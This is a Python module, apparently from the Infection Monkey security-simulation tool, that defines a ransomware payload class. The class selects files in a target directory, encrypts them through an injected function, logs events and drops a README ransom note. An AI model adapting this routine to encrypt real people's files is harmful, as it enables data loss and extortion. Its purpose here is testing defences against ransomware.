import logging
import threading
from pathlib import Path
from typing import Callable, Iterable

from common.agent_events import FileEncryptionEvent
from common.event_queue import IAgentEventQueue
from common.tags import T1486_ATTACK_TECHNIQUE_TAG
from infection_monkey.utils.ids import get_agent_id
from infection_monkey.utils.threading import interruptible_function, interruptible_iter

from .consts import README_FILE_NAME, README_SRC
from .ransomware_options import RansomwareOptions

logger = logging.getLogger(__name__)

RANSOMWARE_PAYLOAD_TAG = "ransomware-payload"
RANSOMWARE_TAGS = frozenset({RANSOMWARE_PAYLOAD_TAG, T1486_ATTACK_TECHNIQUE_TAG})


class Ransomware:
    def __init__(
        self,
        config: RansomwareOptions,
        encrypt_file: Callable[[Path], None],
        select_files: Callable[[Path], Iterable[Path]],
        leave_readme: Callable[[Path, Path], None],
        agent_event_queue: IAgentEventQueue,
    ):
        self._config = config

        self._encrypt_file = encrypt_file
        self._select_files = select_files
        self._leave_readme = leave_readme
        self._agent_event_queue = agent_event_queue

        self._target_directory = self._config.target_directory
        self._readme_file_path = (
            self._target_directory / README_FILE_NAME  # type: ignore
            if self._target_directory
            else None
        )

    def run(self, interrupt: threading.Event):
        if not self._target_directory:
            return

        logger.info("Running ransomware payload")

        if self._config.encryption_enabled:
            files_to_encrypt = self._find_files()
            self._encrypt_files(files_to_encrypt, interrupt)

        if self._config.readme_enabled:
            self._leave_readme_in_target_directory(interrupt=interrupt)

    def _find_files(self) -> Iterable[Path]:
        logger.info(f"Collecting files in {self._target_directory}")
        return self._select_files(self._target_directory)  # type: ignore

    def _encrypt_files(self, files_to_encrypt: Iterable[Path], interrupt: threading.Event):
        logger.info(f"Encrypting files in {self._target_directory}")

        interrupted_message = "Received a stop signal, skipping encryption of remaining files"
        for filepath in interruptible_iter(files_to_encrypt, interrupt, interrupted_message):
            try:
                logger.debug(f"Encrypting {filepath}")

                # Note that encrypting a single file is not interruptible. This is so that we avoid
                # leaving half-encrypted files on the user's system.
                self._encrypt_file(filepath)
                self._publish_file_encryption_event(filepath, True, "")
            except Exception as err:
                logger.warning(f"Error encrypting {filepath}: {err}")
                self._publish_file_encryption_event(filepath, False, str(err))

    def _publish_file_encryption_event(self, filepath: Path, success: bool, error: str):
        file_encryption_event = FileEncryptionEvent(
            source=get_agent_id(),
            file_path=filepath,
            success=success,
            error_message=error,
            tags=RANSOMWARE_TAGS,
        )
        self._agent_event_queue.publish(file_encryption_event)

    @interruptible_function(msg="Received a stop signal, skipping leave readme")
    def _leave_readme_in_target_directory(self, *, interrupt: threading.Event):
        try:
            self._leave_readme(README_SRC, self._readme_file_path)  # type: ignore
        except Exception as err:
            logger.warning(f"An error occurred while attempting to leave a README.txt file: {err}")
